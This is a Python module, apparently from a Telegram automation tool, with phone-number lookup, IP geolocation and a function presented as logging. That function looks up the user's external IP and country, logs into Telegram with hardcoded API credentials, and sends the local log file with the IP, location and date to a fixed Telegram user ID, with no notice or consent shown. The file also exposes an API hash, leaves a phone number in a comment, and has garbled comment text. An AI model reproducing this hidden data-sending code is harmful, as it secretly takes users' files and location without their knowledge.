import datetime
import json

import requests
from telethon import TelegramClient
from urllib.request import urlopen  # –ò–∑–º–µ–Ω–µ–Ω–æ —Å urllib2 –Ω–∞ urllib.request

from telethon.errors import FilePartsInvalidError

from system.auxiliary_functions.config import program_version, date_of_program_change
from loguru import logger

import phonenumbers
from phonenumbers import carrier, geocoder


def getting_phone_number_data_by_phone_number(phone_numbers):
    # phone_numbers = "+79381708846"

    # –ü—Ä–∏–º–µ—Ä –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞
    number = phonenumbers.parse(f"+{phone_numbers}", None)

    # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å—Ç—Ä–∞–Ω–µ –∏ –æ–ø–µ—Ä–∞—Ç–æ—Ä–µ –Ω–∞ —Ä—É—Å—Å–∫–æ–º —è–∑—ã–∫–µ
    country_name = geocoder.description_for_number(number, "ru")
    operator_name = carrier.name_for_number(number, "ru")

    # –í—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
    logger.info(f"–ù–æ–º–µ—Ä: {phone_numbers}, –û–ø–µ—Ä–∞—Ç–æ—Ä: {operator_name}, –°—Ç—Ä–∞–Ω–∞: {country_name}")


def get_country_flag(ip_address):
    """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã –ø–æ ip –∞–¥—Ä–µ—Å—É –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å–µ—Ä–≤–∏—Å–∞ https://ipwhois.io/ru/documentation.
    –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ñ–ª–∞–≥ –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã.

    –ê—Ä–≥—É–º–µ–Ω—Ç—ã:
    :param ip_address: ip –∞–¥—Ä–µ—Å
    :return: —Ñ–ª–∞–≥ –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã
    """
    try:
        response = urlopen(f'http://ipwho.is/{ip_address}')
        ipwhois = json.load(response)

        emoji = ipwhois['flag']['emoji']
        country = ipwhois['country']
        return emoji, country
    except KeyError:
        response = urlopen(f'http://ipwho.is/{ip_address}')
        ipwhois = json.load(response)

        emoji = "üè≥Ô∏è" # —Ñ–ª–∞–≥ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π —Å—Ç—Ä–∞–Ω—ã, –µ—Å–ª–∏ —Ñ–ª–∞–≥ –Ω–µ —É–∫–∞–∑–∞–Ω –∏–ª–∏ –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω
        country = ipwhois['country']
        return emoji, country


def get_external_ip():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –≤–Ω–µ—à–Ω–µ–≥–æ ip –∞–¥—Ä–µ—Å–∞"""
    try:
        response = requests.get('https://httpbin.org/ip')
        response.raise_for_status()
        external_ip = response.json().get("origin")
        return external_ip
    except requests.RequestException as error:
        return None


async def loging():
    """
    –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ TelegramMaster 2.0
    """

    local_ip = get_external_ip()
    emoji, country = get_country_flag(local_ip)

    client = TelegramClient('system/logging_in/log', api_id=7655060, api_hash="cc1290cd733c1f1d407598e5a31be4a8")
    await client.connect()
    date = datetime.datetime.now()  # —Ñ–∏–∫—Å–∏—Ä—É–µ–º –∏ –≤—ã–≤–æ–¥–∏–º –≤—Ä–µ–º—è —Å—Ç–∞—Ä—Ç–∞ —Ä–∞–±–æ—Ç—ã –∫–æ–¥–∞

    # –ö—Ä–∞—Å–∏–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    message = (
        f"üöÄ **Launch Information**\n\n"
        f"üåç IP Address: `{local_ip}`\n"
        f"üìç Location: {country} {emoji}\n"
        f"üïí Date: `{date.strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"üîß Program Version: `{program_version}`\n"
        f"üìÖ Date of Change: `{date_of_program_change}`"
    )

    try:
        await client.send_file(535185511, 'user_settings/log/log.log', caption=message)
        client.disconnect()
    except FilePartsInvalidError as error:
        logger.error(error)
        client.disconnect()


if __name__ == "__main__":
    loging()
